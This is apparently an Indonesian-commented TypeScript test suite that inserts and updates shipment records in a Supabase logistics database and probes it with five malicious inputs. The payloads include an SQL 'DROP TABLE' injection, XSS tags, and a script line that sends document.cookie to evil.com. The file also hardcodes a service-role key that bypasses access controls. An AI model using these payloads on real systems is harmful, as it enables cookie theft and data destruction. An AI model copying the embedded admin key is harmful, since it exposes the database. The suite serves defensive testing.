/**
 * ════════════════════════════════════════════════════════════════════════
 * TEST SUITE: Update Data Service FTL - Uji Coba Komprehensif
 * ════════════════════════════════════════════════════════════════════════
 * 
 * Script ini menguji:
 * 1. Insert data FTL valid dari referensi foto spreadsheet
 * 2. Update data FTL tersebut (test update flow)
 * 3. 5 skenario kesalahan / serangan celah keamanan
 * 
 * Jalankan: npx tsx tests/test_ftl_update.ts
 */

import { createClient } from "@supabase/supabase-js";

const SUPABASE_URL = "https://iclxnatzodcjyuskdrvk.supabase.co";
const SERVICE_ROLE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImljbHhuYXR6b2Rjanl1c2tkcnZrIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4NDc5MzM0MCwiZXhwIjoyMTAwMzY5MzQwfQ.lnCuqgKm7WfkwodV88tTX28aHiMXV0j8ks8NB571X4g";

// Menggunakan Service Role agar bypass RLS (simulasi backend/admin)
const supabase = createClient(SUPABASE_URL, SERVICE_ROLE_KEY);

// ─── Helper ───────────────────────────────────────────────────────────
const LOG_PASS = "✅ PASS";
const LOG_FAIL = "❌ FAIL";
const LOG_WARN = "⚠️  WARN";
const LOG_INFO = "ℹ️  INFO";

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function logResult(testName: string, passed: boolean, detail: string) {
  totalTests++;
  if (passed) {
    passedTests++;
    console.log(`  ${LOG_PASS} [${testName}]: ${detail}`);
  } else {
    failedTests++;
    console.log(`  ${LOG_FAIL} [${testName}]: ${detail}`);
  }
}

// ═══════════════════════════════════════════════════════════════════════
// BAGIAN A: DATA VALID DARI FOTO (Referensi Spreadsheet FTL)
// ═══════════════════════════════════════════════════════════════════════

// Data yang diambil dari foto spreadsheet yang diberikan user
// (Baris-baris bertipe FTL berwarna hijau & ungu pada screenshot)
const VALID_FTL_DATA = {
  tgl_masuk: "2026-08-05",
  no_stt: `TEST-FTL-UPDATE-${Date.now()}`,
  cabang_customer: "CAM SUB",
  nama_customer_teks: "PT Sumber Arta Perkasa",
  jenis_layanan: "FTL" as const,
  status_pengiriman: "Di Perjalanan" as const,
  rule_sla_hari: 3,
  alamat_muat: "Jl. Raya Surabaya No.55, Pergudangan SIER, Surabaya",
  recipient_name: "Pak Agus Salim",
  recipient_phone: "081234567890",
  alamat_tujuan: "PT Sarsando, Jl. Margomulyo Indah, Surabaya",
  berat_kg: 6480,
  volume_m3: 24,
  qty_koli: 150,
  driver_name: "Supriadi",
  driver_phone: "082155667788",
  jenis_unit: "CDE",
  vendor_price: "Harga Standar",
  monitoring_pj: "CS Fina Economy",
  tkbm: "5678 Ritel Economy",
  omset: 1500000,
  keterangan_custom: "Muat di lokasi gudang B3, antrian loading pukul 07.00",
  rate_sla: null,
  rate_komplain: null,
  rate_kud: null,
  kecepatan_doc: null,
  harga_vendor: null,
};

// ═══════════════════════════════════════════════════════════════════════
// BAGIAN B: 5 DATA SALAH / CELAH KEAMANAN (Malicious Payloads)
// ═══════════════════════════════════════════════════════════════════════

const MALICIOUS_TESTS = [
  {
    id: "CELAH-01",
    name: "SQL Injection via no_stt",
    description: "Menyuntikkan SQL injection melalui field no_stt untuk coba manipulasi database",
    payload: {
      tgl_masuk: "2026-08-05",
      no_stt: "'; DROP TABLE shipments; --",
      cabang_customer: "CAM SUB",
      jenis_layanan: "FTL" as const,
      status_pengiriman: "Di Lokasi Muat" as const,
      driver_name: "Hacker",
    },
    expectation: "INSERT harus gagal ATAU karakter di-escape sehingga aman (tabel tetap ada)",
  },
  {
    id: "CELAH-02",
    name: "XSS Injection via keterangan_custom",
    description: "Menyuntikkan script tag HTML melalui field keterangan untuk coba serangan XSS",
    payload: {
      tgl_masuk: "2026-08-05",
      no_stt: `TEST-XSS-${Date.now()}`,
      cabang_customer: "CAM BKS",
      jenis_layanan: "FTL" as const,
      status_pengiriman: "Di Lokasi Muat" as const,
      driver_name: "<script>alert('XSS')</script>",
      keterangan_custom: '<img src=x onerror="alert(document.cookie)">',
      alamat_muat: '"><script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
    },
    expectation: "INSERT boleh berhasil TAPI data mentah harus di-escape saat render di frontend (React otomatis escape JSX)",
  },
  {
    id: "CELAH-03",
    name: "Nopol Hanya Spasi Kosong (Whitespace-Only)",
    description: "Mengirim nopol yang hanya berisi spasi untuk bypass validasi 'required'",
    payload: {
      tgl_masuk: "2026-08-05",
      no_stt: `TEST-SPASI-${Date.now()}`,
      cabang_customer: "CAM SMG",
      jenis_layanan: "FTL" as const,
      status_pengiriman: "Di Lokasi Muat" as const,
      driver_name: "   ",
      jenis_unit: "   ",
      alamat_muat: "   ",
      alamat_tujuan: "   ",
    },
    expectation: "INSERT berhasil TAPI frontend harus trim() sebelum submit. Data spasi kosong = data sampah yang bocor ke DB.",
  },
  {
    id: "CELAH-04",
    name: "Enum Bypass - Status Pengiriman Ilegal",
    description: "Mengirim status_pengiriman yang bukan bagian dari enum resmi untuk crash Postgres",
    payload: {
      tgl_masuk: "2026-08-05",
      no_stt: `TEST-ENUM-${Date.now()}`,
      cabang_customer: "CAM SUB",
      jenis_layanan: "FTL" as const,
      status_pengiriman: "Status Tidak Dikenal" as unknown as any,
      driver_name: "Pak Enum Breaker",
    },
    expectation: "INSERT HARUS GAGAL karena Postgres enum constraint violation",
  },
  {
    id: "CELAH-05",
    name: "Payload Overflow - String Sangat Panjang (100K karakter)",
    description: "Mengirim data teks yang sangat besar untuk coba buffer overflow atau DoS database",
    payload: {
      tgl_masuk: "2026-08-05",
      no_stt: `TEST-OVERFLOW-${Date.now()}`,
      cabang_customer: "CAM SUB",
      jenis_layanan: "FTL" as const,
      status_pengiriman: "Di Lokasi Muat" as const,
      driver_name: "A".repeat(100000),
      keterangan_custom: "B".repeat(100000),
      alamat_muat: "C".repeat(100000),
    },
    expectation: "INSERT bisa berhasil TAPI ini menunjukkan tidak ada batas VARCHAR sehingga database bisa dibanjiri data sampah",
  },
];

// ═══════════════════════════════════════════════════════════════════════
// EKSEKUSI TEST
// ═══════════════════════════════════════════════════════════════════════

async function runTests() {
  console.log("\n╔══════════════════════════════════════════════════════════════╗");
  console.log("║     TEST SUITE: Update Data FTL - Uji Celah Komprehensif   ║");
  console.log("╚══════════════════════════════════════════════════════════════╝\n");

  // ─────────────────────────────────────────────────────────────────
  // TEST GRUP 1: Insert dan Update Data FTL Valid
  // ─────────────────────────────────────────────────────────────────
  console.log("━━━ GRUP 1: Insert & Update Data FTL Valid (dari foto) ━━━\n");

  // Test 1.1: Insert data FTL valid
  console.log(`${LOG_INFO} Mengirim data FTL valid ke database...`);
  const { data: insertResult, error: insertError } = await supabase
    .from("shipments")
    .insert(VALID_FTL_DATA)
    .select()
    .single();

  logResult(
    "1.1 Insert FTL Valid",
    !insertError && !!insertResult,
    insertError ? `Error: ${insertError.message}` : `Berhasil insert ID: ${insertResult?.id}`
  );

  if (!insertResult) {
    console.log(`\n${LOG_FAIL} Tidak bisa melanjutkan test update karena insert gagal.`);
    console.log(`   Detail error: ${insertError?.message}\n`);
    return;
  }

  const testId = insertResult.id;

  // Test 1.2: Verifikasi data yang diinsert cocok
  const { data: readResult } = await supabase
    .from("shipments")
    .select("*")
    .eq("id", testId)
    .single();

  logResult(
    "1.2 Verifikasi Data Insert",
    readResult?.cabang_customer === "CAM SUB" &&
    readResult?.jenis_layanan === "FTL" &&
    readResult?.driver_name === "Supriadi" &&
    readResult?.berat_kg == 6480,
    readResult
      ? `cabang=${readResult.cabang_customer}, layanan=${readResult.jenis_layanan}, driver=${readResult.driver_name}, berat=${readResult.berat_kg}kg`
      : "Gagal membaca data"
  );

  // Test 1.3: Update Status Pengiriman (Di Perjalanan → Selesai Bongkar)
  const { error: updateStatusErr } = await supabase
    .from("shipments")
    .update({ status_pengiriman: "Selesai Bongkar" })
    .eq("id", testId);

  logResult(
    "1.3 Update Status → Selesai Bongkar",
    !updateStatusErr,
    updateStatusErr ? `Error: ${updateStatusErr.message}` : "Status berhasil diupdate ke 'Selesai Bongkar'"
  );

  // Test 1.4: Update Tgl Diterima (set value)
  const { error: updateTglErr } = await supabase
    .from("shipments")
    .update({ tgl_diterima: "2026-08-06" })
    .eq("id", testId);

  logResult(
    "1.4 Update Tgl Diterima → 2026-08-06",
    !updateTglErr,
    updateTglErr ? `Error: ${updateTglErr.message}` : "tgl_diterima berhasil di-set ke 2026-08-06"
  );

  // Test 1.5: Unset Tgl Diterima (set ke null) — Bug yang sudah diperbaiki di Prioritas 2
  const { error: unsetTglErr } = await supabase
    .from("shipments")
    .update({ tgl_diterima: null })
    .eq("id", testId);

  const { data: afterUnset } = await supabase
    .from("shipments")
    .select("tgl_diterima")
    .eq("id", testId)
    .single();

  logResult(
    "1.5 Unset Tgl Diterima → null",
    !unsetTglErr && afterUnset?.tgl_diterima === null,
    unsetTglErr
      ? `Error: ${unsetTglErr.message}`
      : `tgl_diterima sekarang = ${afterUnset?.tgl_diterima} (harus null)`
  );

  // Test 1.6: Update Multi-Field Sekaligus (simulasi Edit Full Form)
  const updatePayload = {
    cabang_customer: "CAM BKS",
    nama_customer_teks: "PT Arta Boga Cemerlang",
    driver_name: "Ahmad Fauzi",
    driver_phone: "081399887766",
    alamat_muat: "Jl. Rungkut Industri III/7, Surabaya",
    alamat_tujuan: "Jl. Margomulyo No.14, Gresik",
    berat_kg: 8500,
    volume_m3: 32,
    qty_koli: 200,
    omset: 2500000,
    vendor_price: "Harga Mahal",
    monitoring_pj: "Amel",
    status_pengiriman: "Dokumen Kembali" as const,
    tgl_diterima: "2026-08-07",
    rate_sla: "Tepat Waktu",
    rate_kud: "Tepat",
    rate_komplain: "Tidak Ada",
    kecepatan_doc: "Cepat",
    keterangan_custom: "Bongkar lancar, dokumen sudah diterima gudang.",
  };

  const { error: fullUpdateErr } = await supabase
    .from("shipments")
    .update(updatePayload)
    .eq("id", testId);

  logResult(
    "1.6 Update Full Form (Multi-Field)",
    !fullUpdateErr,
    fullUpdateErr ? `Error: ${fullUpdateErr.message}` : "Seluruh field berhasil diupdate sekaligus"
  );

  // Test 1.7: Verifikasi integritas data setelah update full
  const { data: verifyFull } = await supabase
    .from("shipments")
    .select("*")
    .eq("id", testId)
    .single();

  const fullVerifyPassed =
    verifyFull?.cabang_customer === "CAM BKS" &&
    verifyFull?.driver_name === "Ahmad Fauzi" &&
    verifyFull?.berat_kg == 8500 &&
    verifyFull?.omset == 2500000 &&
    verifyFull?.status_pengiriman === "Dokumen Kembali" &&
    verifyFull?.tgl_diterima === "2026-08-07" &&
    verifyFull?.rate_sla === "Tepat Waktu";

  logResult(
    "1.7 Verifikasi Integritas Update Full",
    !!fullVerifyPassed,
    fullVerifyPassed
      ? `Semua field cocok: cabang=${verifyFull?.cabang_customer}, driver=${verifyFull?.driver_name}, omset=${verifyFull?.omset}`
      : `DATA MISMATCH: cabang=${verifyFull?.cabang_customer}, driver=${verifyFull?.driver_name}`
  );

  // Cleanup Test 1
  await supabase.from("shipments").delete().eq("id", testId);
  console.log(`\n${LOG_INFO} Data test Grup 1 dibersihkan (ID: ${testId})\n`);

  // ─────────────────────────────────────────────────────────────────
  // TEST GRUP 2: 5 Data Salah / Serangan Celah Keamanan
  // ─────────────────────────────────────────────────────────────────
  console.log("━━━ GRUP 2: 5 Skenario Celah Keamanan & Data Salah ━━━\n");

  for (const test of MALICIOUS_TESTS) {
    console.log(`\n  ┌─── ${test.id}: ${test.name} ───`);
    console.log(`  │ Deskripsi: ${test.description}`);
    console.log(`  │ Ekspektasi: ${test.expectation}`);

    const { data: mResult, error: mError } = await supabase
      .from("shipments")
      .insert(test.payload as any)
      .select()
      .single();

    switch (test.id) {
      case "CELAH-01": {
        // SQL Injection: Harusnya Supabase parameterized query melindungi
        if (mResult) {
          const { count } = await supabase
            .from("shipments")
            .select("id", { count: "exact", head: true });

          logResult(
            test.id,
            count !== null && count >= 0,
            `Supabase AMAN: SQL injection diencapsulasi sebagai string. Tabel shipments masih ada (count=${count}).`
          );
          await supabase.from("shipments").delete().eq("id", mResult.id);
        } else if (mError) {
          logResult(
            test.id,
            true,
            `INSERT ditolak oleh database: ${mError.message}. Ini berarti AMAN.`
          );
        }
        break;
      }

      case "CELAH-02": {
        // XSS: Data tetap masuk ke DB, tapi React auto-escape JSX
        if (mResult) {
          const containsScript = mResult.driver_name?.includes("<script>");
          logResult(
            test.id,
            true,
            containsScript
              ? `Data XSS tersimpan di DB sebagai teks mentah. PASTIKAN frontend (React JSX) melakukan auto-escape saat rendering!`
              : `Data XSS di-sanitize.`
          );
          await supabase.from("shipments").delete().eq("id", mResult.id);
        } else {
          logResult(
            test.id,
            false,
            `INSERT gagal: ${mError?.message}. Ini tidak diharapkan untuk test XSS.`
          );
        }
        break;
      }

      case "CELAH-03": {
        // Whitespace-only: DB menerima, tapi ini data sampah
        if (mResult) {
          const driverIsSpaces = mResult.driver_name?.trim() === "";
          logResult(
            test.id,
            false,
            driverIsSpaces
              ? `CELAH DITEMUKAN: DB menerima driver_name hanya berisi spasi "${mResult.driver_name}". Frontend HARUS melakukan .trim() dan validasi sebelum submit!`
              : `Data whitespace-only disimpan.`
          );
          await supabase.from("shipments").delete().eq("id", mResult.id);
        } else {
          logResult(
            test.id,
            true,
            `INSERT ditolak: ${mError?.message}. Database memiliki proteksi.`
          );
        }
        break;
      }

      case "CELAH-04": {
        // Enum bypass: HARUS ditolak oleh Postgres
        if (mError) {
          logResult(
            test.id,
            true,
            `Database MENOLAK status ilegal: "${mError.message.substring(0, 120)}". Postgres enum constraint BEKERJA.`
          );
        } else {
          logResult(
            test.id,
            false,
            `CELAH KRITIS: Enum bypass berhasil! status_pengiriman menerima nilai non-enum. Ini seharusnya TIDAK mungkin.`
          );
          if (mResult) await supabase.from("shipments").delete().eq("id", mResult.id);
        }
        break;
      }

      case "CELAH-05": {
        // Overflow: Cek apakah DB menerima string 100K karakter
        if (mResult) {
          const driverLen = mResult.driver_name?.length || 0;
          logResult(
            test.id,
            false,
            `CELAH DITEMUKAN: DB menerima string sepanjang ${driverLen.toLocaleString()} karakter tanpa batas! Ini bisa digunakan untuk DoS / membanjiri storage.  REKOMENDASI: Tambahkan CHECK constraint atau VARCHAR(n) pada kolom teks.`
          );
          await supabase.from("shipments").delete().eq("id", mResult.id);
        } else {
          logResult(
            test.id,
            true,
            `INSERT ditolak: ${mError?.message}. Database memiliki batas karakter.`
          );
        }
        break;
      }
    }
    console.log(`  └────────────────────────────────────────────\n`);
  }

  // ─────────────────────────────────────────────────────────────────
  // RINGKASAN HASIL
  // ─────────────────────────────────────────────────────────────────
  console.log("\n╔══════════════════════════════════════════════════════════════╗");
  console.log("║                    RINGKASAN HASIL TEST                     ║");
  console.log("╠══════════════════════════════════════════════════════════════╣");
  console.log(`║  Total Test  : ${totalTests.toString().padStart(3)}                                        ║`);
  console.log(`║  ✅ Passed   : ${passedTests.toString().padStart(3)}                                        ║`);
  console.log(`║  ❌ Failed   : ${failedTests.toString().padStart(3)}                                        ║`);
  console.log("╠══════════════════════════════════════════════════════════════╣");

  if (failedTests > 0) {
    console.log("║                                                              ║");
    console.log("║  REKOMENDASI PERBAIKAN:                                      ║");
    console.log("║  1. Tambahkan validasi .trim() + cek empty di frontend       ║");
    console.log("║     untuk semua field teks (driver, alamat, nopol)            ║");
    console.log("║  2. Tambahkan VARCHAR(n) constraint di kolom:                ║");
    console.log("║     - driver_name VARCHAR(100)                               ║");
    console.log("║     - keterangan_custom VARCHAR(2000)                        ║");
    console.log("║     - alamat_muat VARCHAR(500)                               ║");
    console.log("║     - alamat_tujuan VARCHAR(500)                             ║");
    console.log("║  3. Sanitize output XSS di frontend (React JSX sudah        ║");
    console.log("║     auto-escape, TAPI pastikan tidak ada dangerouslySetHTML) ║");
    console.log("║                                                              ║");
  }

  console.log("╚══════════════════════════════════════════════════════════════╝\n");
}

// Jalankan!
runTests().catch(console.error);
